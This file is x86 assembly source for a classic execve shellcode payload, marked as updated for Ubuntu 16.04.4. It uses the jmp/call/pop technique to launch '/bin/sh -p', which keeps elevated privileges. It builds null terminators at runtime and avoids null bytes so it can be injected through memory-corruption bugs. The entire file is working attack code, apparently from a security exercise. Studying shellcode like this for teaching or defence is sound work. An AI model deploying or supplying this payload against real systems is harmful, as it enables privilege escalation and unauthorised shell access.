#include <sys/syscall.h>

// Updated version for Ubuntu 16.04.4 by Pongsin	
	
#define STRING	"/bin/sh -p"
#define ARG1NULL	7
#define ARG2	8
#define ARG2NULL	10
#define STRLEN	10	
#define ARGV	(STRLEN+1)
#define ARGV2	(ARGV+4)	
#define ENVP	(ARGV+8)

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
	popl	%esi
	movl	%esi,(ARGV)(%esi)	/* set up argv pointer to pathname */
	leal	ARG2(%esi),%eax		/* param */
	movl    %eax,(ARGV2)(%esi)	/* set up argv[2] pointer to param */
	xorl	%eax,%eax		/* get a 32-bit zero value */
	movb	%al,(ARG1NULL)(%esi)	/* null-terminate pathname string */
	movb	%al,(ARG2NULL)(%esi)	/* null-terminate param string */
	movl	%eax,(ENVP)(%esi)	/* set up null envp */

	movb	$SYS_execve,%al		/* syscall arg 1: syscall number */
	movl	%esi,%ebx		/* syscall arg 2: string pathname */
	leal	ARGV(%esi),%ecx		/* syscall arg 2: argv */
	leal	ENVP(%esi),%edx		/* syscall arg 3: envp */
	int	$0x80			/* invoke syscall */

	xorl	%ebx,%ebx		/* syscall arg 2: 0 */
	movl	%ebx,%eax
	inc	%eax			/* syscall arg 1: SYS_exit (1), uses */
					/* mov+inc to avoid null byte */
	int	$0x80			/* invoke syscall */

 calladdr:
	call	popladdr
	.ascii	STRING
